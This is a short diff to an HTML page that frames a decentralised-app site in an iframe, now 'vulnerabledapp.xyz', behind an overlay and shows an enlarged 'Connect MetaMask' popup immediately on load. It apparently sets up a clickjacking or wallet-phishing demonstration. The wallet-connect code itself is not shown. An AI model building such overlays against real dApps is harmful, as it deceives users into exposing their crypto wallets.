@@ -25,6 +25,9 @@
         #popup button {
             display: block;
             margin: 20px auto 0;
+            padding: 20px 40px;
+            font-size: 24px;
+            cursor: pointer;
         }
         #overlay {
             display: none;
@@ -53,7 +56,7 @@
         <button onclick="connectMetaMask()">Connect MetaMask</button>
     </div>
     <div id="iframe-container">
-        <iframe src="https://bridge.mantle.xyz/"></iframe>
+        <iframe src="https://vulnerabledapp.xyz/"></iframe>
     </div>
     <script>
         async function connectMetaMask() {
@@ -78,7 +81,7 @@
         }
 
         window.onload = function() {
-            setTimeout(showPopup, 1000); // Show the popup after 1 second
+            showPopup(); // Show the popup immediately
         }
     </script>
 </body>
